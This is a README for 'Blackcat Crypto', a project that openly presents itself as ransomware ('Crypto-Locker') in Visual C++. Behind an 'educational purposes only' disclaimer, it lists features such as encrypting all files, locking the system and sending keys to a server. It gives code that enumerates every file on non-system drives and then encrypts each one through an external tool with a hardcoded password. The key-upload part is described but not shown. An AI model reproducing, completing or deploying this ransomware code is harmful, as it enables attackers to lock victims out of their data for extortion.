#### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

<img src="logon.png" alt="logo">

# Blackcat Crypto

Blackcat Crypto is open source Crypto-Locker. Blackcat Crypto is developed in Visual C++. It has features encrypt all file, lock down the system and send keys back to the server. Multi-threaded functionality helps to this tool make encryption faster.

## Features

1. Strong AES Encryption. (Unbreakable)
2. Lockdown System Functionailty.
3. Multi-Thread Encryption.
4. Powerful Web Admin Interface

## Step 1 (Fetch files)

Getting all files from all drive to encrypting them.

Here is Visual C++ program get all list directory & files in drive and store path in text file for encryption later use. I use Boost C++ libraries to get all files list. Please first setup Boost libraries to compile program.

```
#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>

using namespace std;

fstream out_file("data.txt", ios::out);

#define MAX 256

int main(int argc, char* argv[]) {

	int dr_type = 99;
	char dr_avail[MAX];
	char *temp = dr_avail;

	/* 1st we fill the buffer */
	GetLogicalDriveStrings(MAX, dr_avail);
	while (*temp != NULL) { // Split the buffer by null
		dr_type = GetDriveType(temp);

		char skip[10] = "C:\\";

		if (dr_type == 3 && temp[0] != 'C') {

			boost::system::error_code dir_error;

			for (boost::filesystem::recursive_directory_iterator end, dir(temp, dir_error); dir != end; dir.increment(dir_error)) {
				if (dir_error.value()) {
					cerr << "Error accessing file: " << dir_error.message() << endl;
				}
				else {
					cout << dir->path() << endl;
					out_file << dir->path() << "\n";
				}
			}
		}
		temp += lstrlen(temp) + 1;
	}
	out_file.close();
	system("pause");
	
```

## Step 2 (Encrypt files)

Here firstly I get every file path from "data.txt" line by line and send to this crypy tool with type encryption and password. you can also embed all this program in upper loop for getting path and encrypting data recursively.

```
out_file.open("data.txt", ios::in);
	string line;
	while (out_file.good()) {
		getline(out_file, line);
		cout << line << endl;
		std::string cmmd = "crpt.exe -e -p 4321 ";
		cmmd += line;
		system(cmmd.c_str());
	}
```

# Currently in Development....
# Happy Cyber Security.....Happy Open Source...
# :)
